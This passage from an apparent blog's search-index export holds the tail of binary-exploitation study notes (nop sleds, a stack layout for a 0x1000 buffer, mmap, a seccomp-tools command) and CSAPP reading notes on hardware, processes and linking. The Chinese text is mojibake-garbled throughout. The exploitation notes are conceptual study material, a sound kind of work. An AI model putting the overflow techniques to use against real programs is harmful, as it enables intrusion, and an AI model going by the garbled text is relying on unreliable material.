å‡½æ•°è¿”å›åœ°å€ -------&gt;</span> æ”»å‡»ä»£ç ã€‚</span><br><span class="line">ä½¿ç”¨ <span class="function"><span class="title">nop</span> sled ï¼Œ å‡½æ•°è¿”å›åœ°å€ -------&gt;</span> nop åºåˆ—ï¼ˆé¡ºåºæ‰§è¡Œï¼‰ ç›´åˆ°æ”»å‡»ä»£ç åœ°å€</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230811142321120.png" alt="image-20230811142321120"></p><p>æœ¬åœ°ç¼“å†²åŒºå¤§å°ä½0x1000</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230811143658329.png" alt="image-20230811143658329"></p><p>v2 &#x3D; rand() % 1337 - 668; ï¼šè¿™è¡Œä»£ç ä½¿ç”¨ rand å‡½æ•°ç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œå¹¶é€šè¿‡å–æ¨¡è¿ç®—å°†å…¶ é™åˆ¶åœ¨èŒƒå›´ 0 åˆ° 1336 ä¹‹é—´ã€‚ç„¶åï¼Œä»ç»“æœä¸­å‡å» 668ï¼Œå¾—åˆ°ä¸€ä¸ªèŒƒå›´åœ¨ -668 åˆ° 668 ä¹‹é—´çš„éšæœºæ•´ æ•°ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨å˜é‡ v2 ä¸­</p><table><thead><tr><th>è¾ƒä½åœ°å€</th><th>&#x3D;&gt;</th><th>&#x3D;&gt;</th><th>&#x3D;&gt;</th><th></th></tr></thead><tbody><tr><td>stk[ebp-0x15]</td><td>ebp&#x3D;&gt;(æ—§ebp)</td><td>return addr</td><td>padding[0x10]</td><td>buffer[0x1000]</td></tr></tbody></table><h3 id="mmapï¼ˆï¼‰å‡½æ•°ä¸»è¦ä¸‰ä¸ªç”¨é€”"><a href="#mmapï¼ˆï¼‰å‡½æ•°ä¸»è¦ä¸‰ä¸ªç”¨é€”" class="headerlink" title="mmapï¼ˆï¼‰å‡½æ•°ä¸»è¦ä¸‰ä¸ªç”¨é€”"></a>mmapï¼ˆï¼‰å‡½æ•°ä¸»è¦ä¸‰ä¸ªç”¨é€”</h3><p>1.å°†ä¸€ä¸ªæ™®é€šæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­ã€‚é€šå¸¸éœ€è¦å¯¹æ–‡ä»¶è¿›è¡Œé¢‘ç¹è¯»å†™æ—¶ä½¿ç”¨ï¼Œä½¿å¾—å†…å­˜è¯»å†™å–ä»£I&#x2F;Oè¯»å†™ï¼Œè·å¾—è¾ƒé«˜æ€§èƒ½ã€‚<br>2.å°†ç‰¹æ®Šæ–‡ä»¶è¿›è¡ŒåŒ¿åå†…å­˜æ˜ å°„ï¼Œä¸ºå…³è”è¿›ç¨‹æä¾›å…±äº«å†…å­˜ç©ºé—´<br>3.ä¸ºæ— å…³è”çš„è¿›ç¨‹æä¾›å…±äº«å†…å­˜ç©ºé—´ï¼Œä¸€èˆ¬ä¹Ÿæ˜¯å°†ä¸€ä¸ªæ™®é€šæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­ã€‚</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seccompæç¤ºæ²™ç›’æ£€æŸ¥ </span><br><span class="line">seccomp-tools dump ./elf<span class="symbol">&#x27;s</span> name</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> äºŒè¿›åˆ¶å®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSAPPé˜…è¯»ç¢ç‰‡</title>
      <link href="/2022/11/04/CSAPP%E9%98%85%E8%AF%BB%E7%A2%8E%E7%89%87/"/>
      <url>/2022/11/04/CSAPP%E9%98%85%E8%AF%BB%E7%A2%8E%E7%89%87/</url>
      
        <content type="html"><![CDATA[<h2 id="CSAPPé˜…è¯»ç¢ç‰‡"><a href="#CSAPPé˜…è¯»ç¢ç‰‡" class="headerlink" title="CSAPPé˜…è¯»ç¢ç‰‡"></a>CSAPPé˜…è¯»ç¢ç‰‡</h2><p>é¢„å¤„ç† ç¼–è¯‘ æ±‡ç¼–ï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶ ç›®æ ‡æ–‡ä»¶ï¼‰ é“¾æ¥<br>shell â€“ å‘½ä»¤è§£é‡Šå™¨ï¼ˆé»˜è®¤è®¾ç½®ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20230915193018922.png" alt="image-20230915193018922"></p><h3 id="ç³»ç»Ÿçš„ç¡¬ä»¶ç»„æˆ"><a href="#ç³»ç»Ÿçš„ç¡¬ä»¶ç»„æˆ" class="headerlink" title="ç³»ç»Ÿçš„ç¡¬ä»¶ç»„æˆ"></a>ç³»ç»Ÿçš„ç¡¬ä»¶ç»„æˆ</h3><p><strong>1.æ€»çº¿</strong> â€“ å„ä¸ªéƒ¨ä»¶ä¸­ä¼ é€’ä¸”æºå¸¦ä¿¡æ¯å­—èŠ‚çš„ä¼ é€å®šé•¿å­—èŠ‚å—[4&#x2F;8]ï¼ˆå­— wordï¼‰<br><strong>2.I&#x2F;Oè®¾å¤‡</strong>  ä¸»æ¿ï¼ˆI&#x2F;Oè®¾å¤‡æœ¬èº«æˆ–ç³»ç»Ÿçš„ä¸»å°<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20231112153110859.png" alt="image-20231112153110859">ç”µè·¯æ¿ä¸Šçš„èŠ¯ç‰‡ç»„ï¼‰â€“ åœ¨I&#x2F;Oæ€»çº¿å’ŒI&#x2F;Oè®¾å¤‡é—´ä¼ é€’æ¶ˆæ¯<br>ã€ä¸€ä¸ªå…¸å‹ç³»ç»Ÿçš„ç¡¬ä»¶ç»„æˆã€‘<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230830195055368.png" alt="image-20230830195055368"></p><p><strong>3.ä¸»å­˜</strong> â€“ä¸´æ—¶å­˜æ”¾ç¨‹åºå’Œç¨‹åºå¤„ç†æ•°æ®çš„ä¸€ç»„åŠ¨æ€éšæœºå­˜å–å­˜å‚¨å™¨ï¼ˆDRAMï¼‰èŠ¯ç‰‡. é€»è¾‘ä¸Šå­˜å‚¨å™¨æ˜¯æ¯å­—èŠ‚æœ‰å”¯ä¸€æ•°ç»„ç´¢å¼•çš„çº¿æ€§å­—èŠ‚æ•°ç»„<br><strong>4.å¤„ç†å™¨ï¼ˆè¯»å–å¹¶è§£é‡Šå­˜æ”¾åœ¨ä¸»å­˜é‡Œçš„äºŒè¿›åˆ¶æŒ‡ä»¤ï¼‰ï¼ˆ</strong>ä¸­å¤®å¤„ç†å•å…ƒã€CPUã€‘ï¼‰â€“è§£é‡Šï¼ˆæˆ–æ‰§è¡Œï¼‰å­˜å‚¨åœ¨ä¸»å­˜ä¸­æŒ‡ä»¤çš„å¼•æ“ä¸­å¤®å¤„ç†å•å…ƒ å¤„ç†å™¨çš„æ ¸å¿ƒæ˜¯å¤§å°ä¸ºä¸€å­—èŠ‚çš„å­˜å‚¨è®¾å¤‡â€“ç¨‹åºè®¡æ•°å™¨PC ä»»ä½•æ—¶åˆ»PCéƒ½æŒ‡å‘ä¸»å­˜ä¸­çš„å«æŒ‡ä»¤åœ°å€çš„æŸæ¡æœºå™¨è¯­è¨€æŒ‡ä»¤ </p><p><strong>å¤„ç†å™¨çš„æŒ‡ä»¤é›†â€“æè¿°æ¯æ¡æœºå™¨ä»£ç æŒ‡ä»¤çš„æ•ˆæœ</strong><br><strong>å¤„ç†å™¨çš„å¾®ä½“ç³»ç»“æ„â€“å¤„ç†å™¨å®é™…æ˜¯æ€ä¹ˆå®ç°çš„</strong></p><p>ç¨‹åºç»æ±‡ç¼–åçš„æœºå™¨æŒ‡ä»¤æœ€åˆå­˜æ”¾åœ¨ç£ç›˜ä¸Šï¼Œç¨‹åºåŠ è½½æ—¶è¢«å¤åˆ¶åˆ°ä¸»å­˜ï¼Œå¤„ç†å™¨è¿è¡Œç¨‹åºæ—¶ï¼ŒæŒ‡ä»¤ä»ä¸»å­˜å¤åˆ¶åˆ°å¤„ç†å™¨</p><p>é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨ï¼ˆcache memoryï¼‰ï¼šä½œä¸ºæš‚æ—¶é›†ç»“çš„åŒºåŸŸï¼Œå­˜æ”¾å¤„ç†å™¨è¿‘æœŸå¯èƒ½ä¼šéœ€è¦çš„ä¿¡æ¯.<br>é«˜é€Ÿç¼“å­˜çš„å±€éƒ¨æ€§åŸç†ï¼šç¨‹åºå…·æœ‰è®¿é—®å±€éƒ¨åŒºåŸŸé‡Œçš„æ•°æ®å’Œä»£ç çš„è¶‹åŠ¿ï¼Œé€šè¿‡è®©å‘Šè¯‰ç¼“å­˜é‡Œå­˜æ”¾å¯èƒ½ç»å¸¸è®¿é—®çš„æ•°æ®ï¼Œå¤§éƒ¨åˆ†çš„å†…å­˜æ“ä½œéƒ½èƒ½åœ¨å¿«é€Ÿçš„é«˜é€Ÿç¼“å­˜ä¸­å®Œæˆ.</p><h3 id="é™æ€éšæœºè®¿é—®å­˜å‚¨å™¨ï¼ˆSRAMï¼‰ï¼šL1ã€L2é«˜é€Ÿç¼“å­˜ä¾èµ–"><a href="#é™æ€éšæœºè®¿é—®å­˜å‚¨å™¨ï¼ˆSRAMï¼‰ï¼šL1ã€L2é«˜é€Ÿç¼“å­˜ä¾èµ–" class="headerlink" title="é™æ€éšæœºè®¿é—®å­˜å‚¨å™¨ï¼ˆSRAMï¼‰ï¼šL1ã€L2é«˜é€Ÿç¼“å­˜ä¾èµ–"></a>é™æ€éšæœºè®¿é—®å­˜å‚¨å™¨ï¼ˆSRAMï¼‰ï¼šL1ã€L2é«˜é€Ÿç¼“å­˜ä¾èµ–</h3><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230831223813540.png" alt="image-20230831223813540"></p><h3 id="å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„"><a href="#å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„" class="headerlink" title="å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„"></a>å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„</h3><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230831231036426.png" alt="image-20230831231036426"></p><h3 id="æ“ä½œç³»ç»Ÿç®¡ç†ç¡¬ä»¶"><a href="#æ“ä½œç³»ç»Ÿç®¡ç†ç¡¬ä»¶" class="headerlink" title="æ“ä½œç³»ç»Ÿç®¡ç†ç¡¬ä»¶"></a>æ“ä½œç³»ç»Ÿç®¡ç†ç¡¬ä»¶</h3><p>shellåŠ è½½å’Œè¿è¡Œç¨‹åºéƒ½ä¾é æ“ä½œç³»ç»Ÿå¹¶æœªç›´æ¥è®¿é—®ç¡¬ä»¶.<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230901100821015.png" alt="image-20230901100821015"></p><h4 id="æ“ä½œç³»ç»Ÿä¸¤ä¸ªåŸºæœ¬åŠŸèƒ½ï¼ˆé€šè¿‡è¿›ç¨‹ã€è™šæ‹Ÿå†…å­˜ã€æ–‡ä»¶å®ç°ï¼‰ï¼š"><a href="#æ“ä½œç³»ç»Ÿä¸¤ä¸ªåŸºæœ¬åŠŸèƒ½ï¼ˆé€šè¿‡è¿›ç¨‹ã€è™šæ‹Ÿå†…å­˜ã€æ–‡ä»¶å®ç°ï¼‰ï¼š" class="headerlink" title="æ“ä½œç³»ç»Ÿä¸¤ä¸ªåŸºæœ¬åŠŸèƒ½ï¼ˆé€šè¿‡è¿›ç¨‹ã€è™šæ‹Ÿå†…å­˜ã€æ–‡ä»¶å®ç°ï¼‰ï¼š"></a><strong>æ“ä½œç³»ç»Ÿä¸¤ä¸ªåŸºæœ¬åŠŸèƒ½</strong>ï¼ˆé€šè¿‡è¿›ç¨‹ã€è™šæ‹Ÿå†…å­˜ã€æ–‡ä»¶å®ç°ï¼‰ï¼š</h4><p>1.é˜²æ­¢ç¡¬ä»¶è¢«å¤±æ§çš„åº”ç”¨ç¨‹åºæ»¥ç”¨<br>2.å‘åº”ç”¨ç¨‹åºæä¾›ç®€å•ä¸€è‡´çš„æœºåˆ¶æ¥æ§åˆ¶å¤æ‚åˆé€šå¸¸å¤§ä¸ç›¸åŒçš„ä½çº§ç¡¬ä»¶è®¾å¤‡.<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230901102402944.png" alt="image-20230901102402944"></p><p>è¿›ç¨‹:æ“ä½œç³»ç»Ÿå¯¹æ­£åœ¨è¿›è¡Œçš„ç¨‹åºçš„ä¸€ç§æŠ½è±¡ï¼Œå³åœ¨ä¸€ä¸ªç³»ç»Ÿä¸Šå¯ä»¥åŒæ—¶è¿è¡Œå¤šä¸ªè¿›ç¨‹è€Œæ¯ä¸ªè¿›ç¨‹å¥½åƒéƒ½åœ¨ç‹¬ç«‹åœ°ä½¿ç”¨ç¡¬ä»¶.</p><p><strong>å¹¶å‘è¿è¡Œ</strong>ï¼šä¸€ä¸ªè¿›ç¨‹çš„æŒ‡ä»¤å’Œå’Œå¦ä¸€ä¸ªè¿›ç¨‹çš„æŒ‡ä»¤æ˜¯äº¤é”™æ‰§è¡Œçš„.</p><p><strong>ä¸Šä¸‹æ–‡</strong>ï¼šæ“ä½œç³»ç»Ÿä¿æŒè·Ÿè¸ªè¿›ç¨‹è¿è¡Œæ‰€éœ€çš„æ‰€æœ‰çŠ¶æ€ä¿¡æ¯çš„çŠ¶æ€.ä¸Šä¸‹æ–‡åˆ‡æ¢å‘ç”Ÿåœ¨æ“ä½œç³»ç»Ÿå†³å®šæŠŠæ§åˆ¶æƒç”±å½“å‰è½¬ç§»åˆ°æŸä¸ªæ–°è¿›ç¨‹æ—¶.<br>æµç¨‹ï¼šä¿å­˜å½“å‰ä¸Šä¸‹æ–‡â€“æ¢å¤æ–°è¿›ç¨‹çš„ä¸Šä¸‹æ–‡â€“æ§åˆ¶æƒç”±æ—§åˆ°æ–°</p><p>ä»ä¸€ä¸ªè¿›ç¨‹åˆ°å¦ä¸€ä¸ªè¿›ç¨‹çš„è½¬æ¢ç”±æ“ä½œç³»ç»Ÿå†…æ ¸ç®¡ç†<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230901103917224.png" alt="image-20230901103917224"></p><p>ï¼ˆæŸäº›æ“ä½œâ€“ç³»ç»Ÿè°ƒç”¨â€“æ§åˆ¶æƒä¼ ç»™å†…æ ¸â€“æ‰§è¡Œè¢«è¯·æ±‚æ“ä½œâ€“è¿”å›åº”ç”¨ç¨‹åºï¼‰å†…æ ¸æ—¶æ“ä½œç³»ç»Ÿä»£ç å¸¸é©»ä¸»å­˜çš„éƒ¨åˆ†ï¼Œå®ƒä¸æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ï¼Œå®ƒæ˜¯ç³»ç»Ÿç®¡ç†å…¨éƒ¨è¿›ç¨‹æ‰€ç”¨ä»£ç å’Œæ•°æ®ç»“æ„çš„é›†åˆ.</p><p><strong>çº¿ç¨‹</strong>ï¼šè¿›ç¨‹çš„æ‰§è¡Œå•å…ƒ.å³ä¸€ä¸ªè¿›è¡Œç”±å¤šä¸ªçº¿ç¨‹çš„æ‰§è¡Œå•å…ƒç»„æˆ.<br>çº¿ç¨‹ä¸€èˆ¬æ¯”è¿›ç¨‹æ›´é«˜æ•ˆï¼šæ¯ä¸ªçº¿ç¨‹åœ¨è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ä¸­ä¸”å…±äº«ç›¸åŒçš„ä»£ç å’Œå…¨å±€æ•°æ®ï¼›å¤šçº¿ç¨‹æ¯”å¤šè¿›ç¨‹ä¹‹é—´æ›´å®¹æ˜“å…±äº«æ•°æ®</p><p><strong>è™šæ‹Ÿå†…å­˜</strong>ï¼šä¸ºè¿›ç¨‹æä¾›çš„å‡è±¡â€“æ¯ä¸ªè¿›ç¨‹éƒ½åœ¨ç‹¬ç«‹åœ°ä½¿ç”¨ä¸»å­˜.æ¯ä¸ªè¿›ç¨‹çœ‹åˆ°ä¸€è‡´çš„å†…å­˜â€“è™šæ‹Ÿåœ°å€ç©ºé—´.</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230901105945968.png" alt="image-20230901105945968"></p><p>åœ°å€ç©ºé—´æœ€ä¸Šé¢çš„åŒºåŸŸæ˜¯ä¿ç•™ç»™æ“ä½œç³»ç»Ÿä¸­çš„ä»£ç å’Œæ•°æ®çš„ï¼Œè¿™å¯¹æ‰€æœ‰è¿›ç¨‹æ¥è¯´éƒ½æ˜¯ä¸€æ ·ã€‚åœ°å€ç©ºé—´çš„åº•éƒ¨åŒºåŸŸ</p><p><strong>ç³»ç»Ÿä¹‹é—´åˆ©ç”¨ç½‘ç»œé€šä¿¡</strong>ï¼šå½“ç³»ç»Ÿä»ä¸»å­˜å¤åˆ¶ä¸€ä¸²å­—èŠ‚åˆ°ç½‘ç»œé€‚é…å™¨æ—¶ï¼Œæ•°æ®æµç»è¿‡ç½‘ç»œåˆ°è¾¾å¦ä¸€å°æœºå™¨ï¼Œè€Œä¸æ˜¯æ¯”å¦‚è¯´åˆ°è¾¾æœ¬åœ°ç£ç›˜é©±åŠ¨å™¨ã€‚ç›¸ä¼¼åœ°ï¼Œç³»ç»Ÿå¯ä»¥è¯»å–ä»å…¶ä»–æœºå™¨å‘é€æ¥çš„æ•°æ®ï¼Œå¹¶æŠŠæ•°æ®å¤åˆ¶åˆ°è‡ªå·±çš„ä¸»å­˜ã€‚<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230901111304108.png" alt="image-20230901111304108"></p><p><strong>Amdahlå®šå¾‹</strong><br>ä¸»è¦æ€æƒ³ï¼šå¯¹ç³»ç»ŸæŸéƒ¨åˆ†åŠ é€Ÿæ—¶ï¼Œå…¶å¯¹ç³»ç»Ÿæ•´ä½“çš„å½±å“æ€§èƒ½å–å†³äºè¯¥éƒ¨åˆ†çš„é‡è¦æ€§å’ŒåŠ é€Ÿç¨‹åº¦.</p><p>å³æƒ³æ˜¾è‘—åŠ é€Ÿæ•´ä¸ªç³»ç»Ÿå¿…é¡»æå‡å…¨ç³»ç»Ÿä¸­ç›¸å½“å¤§çš„éƒ¨åˆ†çš„é€Ÿåº¦.<img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20230903102649463.png" alt="image-20230903102649463"></p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>1.è®¡ç®—æœºç³»ç»Ÿæ˜¯ç”±ç¡¬ä»¶å’Œè½¯ä»¶ç»„æˆçš„ï¼Œå®ƒä»¬å…±åŒåä½œä»¥è¿è¡Œåº”ç”¨ç¨‹åº.<br>2.ç¨‹åºè¢«å…¶ä»–ç¨‹åºç¿»è¯‘æˆä¸åŒçš„å½¢å¼ï¼Œå…ˆASCIIæ–‡æœ¬åè¢«ç¼–è¯‘å™¨å’Œé“¾æ¥å™¨ç¿»è¯‘æˆäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶.<br>3.è®¡ç®—æœºèŠ±è´¹äº†å¤§é‡çš„æ—¶é—´åœ¨å†…å­˜ã€I&#x2F;Oè®¾å¤‡å’ŒCPUå¯„å­˜å™¨ä¹‹é—´å¤åˆ¶æ•°æ®ï¼Œå› æ­¤ç³»ç»Ÿè¢«åˆ’åˆ†æˆå±‚æ¬¡ç»“æ„ï¼ˆä¸Šé¢çš„é™„å›¾wwï¼‰é¡¶ï¼šCPU ä¸‹ä¸€å±‚ï¼šå¤šå±‚çš„ç¡¬ä»¶é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨ã€DRAMä¸»å­˜å’Œ<br>4.æ“ä½œç³»ç»Ÿå†…æ ¸æ˜¯åº”ç”¨ç¨‹åºå’Œç¡¬ä»¶ä¹‹é—´çš„åª’ä»‹.æä¾›ä¸‰ä¸ªåŸºæœ¬çš„æŠ½è±¡ï¼š<br>ï¼ˆ1ï¼‰æ–‡ä»¶æ˜¯å¯¹I&#x2F;Oè®¾å¤‡çš„æŠ½è±¡<br>ï¼ˆ2ï¼‰è™šæ‹Ÿå†…å­˜æ˜¯å¯¹ä¸»å­˜å’Œç£ç›˜çš„æŠ½è±¡<br>ï¼ˆ3ï¼‰è¿›ç¨‹æ˜¯å¤„ç†å™¨ã€ä¸»å­˜å’ŒI&#x2F;Oè®¾å¤‡çš„æŠ½è±¡<br>5.ç½‘ç»œæä¾›äº†è®¡ç®—æœºç³»ç»Ÿä¹‹é—´çš„é€šä¿¡æ‰‹æ®µï¼Œç‰¹æ®Šè§’åº¦æ¥çœ‹ç½‘ç»œå°±æ˜¯ä¸€ç§I&#x2F;Oè®¾å¤‡</p><h3 id="åœ¨ç³»ç»Ÿä¸Šè¿è¡Œç¨‹åº"><a href="#åœ¨ç³»ç»Ÿä¸Šè¿è¡Œç¨‹åº" class="headerlink" title="åœ¨ç³»ç»Ÿä¸Šè¿è¡Œç¨‹åº"></a>åœ¨ç³»ç»Ÿä¸Šè¿è¡Œç¨‹åº</h3><p>é“¾æ¥å™¨æŠŠç¨‹åºçš„å„ä¸ªéƒ¨åˆ†è”åˆæˆä¸€ä¸ªæ–‡ä»¶ï¼Œå°†å…¶åŠ è½½åˆ°å†…å­˜å¹¶æ‰§è¡Œã€‚<br>é“¾æ¥å¯åœ¨ç¼–è¯‘æ—¶æ‰§è¡Œï¼ˆæºç è¢«ç¿»è¯‘æˆæœºå™¨ç ï¼‰ï¼ŒåŠ è½½æ—¶ï¼ˆåŠ è½½å™¨æ¶åŠ è½½åˆ°å†…å­˜å¹¶æ‰§è¡Œï¼‰ï¼Œè¿è¡Œæ—¶ï¼ˆç¨‹åºæ‰§è¡Œï¼‰æ‰§è¡Œã€‚<br>é“¾æ¥ç”±é“¾æ¥å™¨ï¼ˆç¨‹åºï¼‰è‡ªåŠ¨æ‰§è¡Œã€‚</p><p>é“¾æ¥å™¨æ˜¯çš„<strong>åˆ†ç¦»ç¼–è¯‘</strong>æˆä¸ºå¯èƒ½ï¼ˆæ›´å°æ¨¡å—åŒ–è¿›è¡Œå¤„ç†ï¼Œæ„Ÿè§‰åƒæŸè¯­è¨€ç‰¹ç‚¹hhï¼‰<br>æ— è®ºä»€ä¹ˆæ ·çš„æ“ä½œç³»ç»Ÿã€ISAæˆ–ç›®æ ‡æ–‡ä»¶æ ¼å¼ï¼ŒåŸºæœ¬çš„é“¾æ¥æ¦‚å¿µæ˜¯é€šç”¨çš„ã€‚</p><p>main.iâ€”â€”&gt;main.s(ASCII)ã€ç¼–è¯‘å™¨ï¼ˆcclï¼‰ã€‘<br>main.sâ€”â€”&gt;main.o(å¯é‡å®šä½æ–‡ä»¶)ã€æ±‡ç¼–å™¨ï¼ˆasã€‘<br>mian.oâ€”â€”&gt;a.outï¼ˆå¯æ‰§è¡Œæ–‡ä»¶ï¼‰ã€é“¾æ¥å™¨(ld)ã€‘</p><h3 id="é™æ€é“¾æ¥"><a href="#é™æ€é“¾æ¥" class="headerlink" title="é™æ€é“¾æ¥"></a>é™æ€é“¾æ¥</h3><p>å¦‚linux ld ç¨‹åºè¿™æ¨æ ·é™æ€é“¾æ¥å™¨ä»¥ä¸€ç»„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œå‘½ä»¤è¡Œå‚æ•°ä½œä¸ºè¾“å…¥ï¼Œç”Ÿæˆä¸€ä¸ªå®Œå…¨é“¾æ¥çš„ã€å¯åŠ è½½å’Œè¿è¡Œçš„å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶è¾“å‡º.</p><p><strong>é“¾æ¥å™¨æ„é€ å¯æ‰§è¡Œæ–‡ä»¶çš„æ­¥éª¤</strong></p><p>ç¬¦å·è§£æï¼ˆsymbol resolutionï¼‰ã€‚<strong>ç›®æ ‡æ–‡ä»¶å®šä¹‰å’Œå¼•ç”¨ç¬¦å·ï¼Œæ¯ä¸ªç¬¦å·å¯¹åº”äºä¸€ä¸ªå‡½æ•°ã€ä¸€ä¸ªå…¨å±€å˜é‡æˆ–ä¸€ä¸ª</strong>é™æ€å˜é‡**ï¼ˆå³ C è¯­è¨€ä¸­ä»»ä½•ä»¥ static å±æ€§å£°æ˜çš„å˜é‡ï¼‰ã€‚ç¬¦å·è§£æçš„ç›®çš„æ˜¯å°†æ¯ä¸ªç¬¦å·å¼•ç”¨æ­£å¥½å’Œä¸€ä¸ªç¬¦å·å®šä¹‰å…³è”èµ·æ¥ã€‚</p><p><strong>é‡å®šä½ï¼ˆrelocationï¼‰ã€‚</strong>ç¼–è¯‘å™¨å’Œæ±‡ç¼–å™¨ç”Ÿæˆä»åœ°å€ 0 å¼€å§‹çš„ä»£ç å’Œæ•°æ®èŠ‚ã€‚é“¾æ¥å™¨é€šè¿‡æŠŠæ¯ä¸ªç¬¦å·å®šä¹‰ä¸ä¸€ä¸ªå†…å­˜ä½ç½®å…³è”èµ·æ¥ï¼Œä»è€Œé‡å®šä½è¿™äº›èŠ‚ï¼Œç„¶åä¿®æ”¹æ‰€æœ‰å¯¹è¿™äº›ç¬¦å·çš„å¼•ç”¨ï¼Œä½¿å¾—å®ƒä»¬æŒ‡å‘è¿™ä¸ªå†…å­˜ä½ç½®ã€‚é“¾æ¥å™¨ä½¿ç”¨æ±‡ç¼–å™¨äº§ç”Ÿçš„<strong>é‡å®šä½æ¡ç›®</strong>ï¼ˆrelocation entryï¼‰çš„è¯¦ç»†æŒ‡ä»¤ï¼Œä¸åŠ ç”„åˆ«åœ°æ‰§è¡Œè¿™æ ·çš„é‡å®šä½ã€‚</p><h3 id="ç›®æ ‡æ–‡ä»¶"><a href="#ç›®æ ‡æ–‡ä»¶" class="headerlink" title="ç›®æ ‡æ–‡ä»¶"></a>ç›®æ ‡æ–‡ä»¶</h3><p>ä¸‰ç§ç±»å‹</p><h4 id="å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶"><a href="#å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶" class="headerlink" title="å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶"></a>å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶</h4><p>åŒ…å«äºŒè¿›åˆ¶ä»£ç å’Œæ•°æ® å½¢å¼å¯ä»¥åœ¨ç¼–è¯‘æ—¶ä¸å…¶ä»–å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶åˆå¹¶ åˆ›å»ºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20231129191018891.png" alt="image-20231129191018891"></p><p>ELFå¤´å‰©ä¸‹çš„éƒ¨åˆ†åŒ…å«å¸®åŠ©é“¾æ¥å™¨è¯­æ³•åˆ†æå’Œè§£é‡Šç›®æ ‡æ–‡ä»¶çš„ä¿¡æ¯ã€‚<br>åŒ…æ‹¬ï¼š<br>ELFå¤´çš„å¤§å°<br>ç›®æ ‡æ–‡ä»¶ç±»å‹ï¼ˆå¦‚ç§‘é‡å®šä½ã€å¯æ‰§è¡Œæˆ–å¯å…±äº«çš„ï¼‰<br>æœºå™¨ç±»å‹ï¼ˆå¦‚x86-64ï¼‰<br>å­—å¤´éƒ¨è¡¨çš„æ–‡ä»¶åç§»<br>èŠ‚å¤´éƒ¨è¡¨ä¸­æ¡ç›®çš„å¤§å°å’Œæ•°é‡</p><p>ä¸åŒèŠ‚çš„ä½ç½®å’Œå¤§å°éƒ½æ˜¯ç”±èŠ‚å¤´éƒ¨è¡¨æè¿°çš„ï¼Œå…¶ä¸­ç›®æ ‡æ–‡ä»¶ä¸­çš„æ¯ä¸€ä¸ªèŠ‚éƒ½æœ‰ä¸€ä¸ªå›ºå®šå¤§å°çš„æ¡ç›®ã€‚      </p><h4 id="å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶"><a href="#å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶" class="headerlink" title="å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶"></a>å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶</h4><p>åŒ…å«äºŒè¿›åˆ¶ä»£ç å’Œæ•°æ® ä¿¡å·æ˜¯å¯ç›´æ¥è¢«å¤åˆ¶åˆ°å†…å­˜</p><h4 id="å…±äº«ç›®æ ‡æ–‡ä»¶"><a href="#å…±äº«ç›®æ ‡æ–‡ä»¶" class="headerlink" title="å…±äº«ç›®æ ‡æ–‡ä»¶"></a>å…±äº«ç›®æ ‡æ–‡ä»¶</h4><p>ä¸€ç§ç‰¹æ®Šç±»å‹çš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ å¯ä»¥åœ¨åŠ è½½æˆ–è¿è¡Œæ—¶è¢«åŠ¨æ€åœ°åŠ è½½è¿›å†…å­˜å¹¶é“¾æ¥.</p>]]></content>
      
      
      <categories>
          
          <category> ç¢ç‰‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
